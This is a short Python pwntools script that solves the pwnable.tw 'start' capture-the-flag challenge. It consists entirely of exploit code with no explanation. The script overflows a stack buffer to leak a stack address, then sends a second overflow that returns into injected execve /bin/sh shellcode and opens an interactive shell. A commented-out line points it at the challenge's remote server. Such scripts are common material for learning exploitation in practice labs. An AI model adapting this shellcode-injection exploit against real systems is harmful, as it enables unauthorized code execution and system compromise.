from pwn import *
p = process("./start")
#p = remote("chall.pwnable.tw", 10000)
context.log_level = 'debug'
p.recv()
p.send('a' * 20 + p32(0x08048087))
stack = u32(p.recv(4))
print hex(stack)
p.send('a' * 0x14 + p32(0x08048060))
p.recv()
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
p.send('a' * 0x14 + p32(stack + 0x500 - 0x4f0) + shellcode)
p.interactive()
